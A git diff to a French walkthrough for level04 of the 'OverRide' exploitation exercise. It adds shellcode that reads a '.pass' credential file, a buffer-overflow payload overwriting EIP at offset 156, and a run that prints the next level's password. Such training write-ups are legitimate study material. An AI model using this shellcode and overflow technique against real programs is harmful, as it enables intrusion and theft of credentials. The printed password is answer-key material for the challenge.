@@ -27,6 +27,17 @@ Le trick sera donc de trouver un shellcode permettant de lire dans un fichier (d
 
 En voici un : http://shell-storm.org/shellcode/files/shellcode-73.php
 
+`export TOTO=$(python -c "print('\x90'*100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass')")`
+
 Nous avons juste besoin de l'offset necessaire pour ecraser EIP, puis de l'adresse de notre shellcode.
 Apres plusieurs tentatives de `print('A'*x)` nous pouvons en deduire que l'offset est de 156.
 
+Nous avons donc notre payload final :
+
+`python -c "print('A'*156 + '\x50\xd8\xff\xff')"`
+
+
+`level04@OverRide:~$ python -c "print('A'*156 + '\x50\xd8\xff\xff')" | ./level04 
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...`
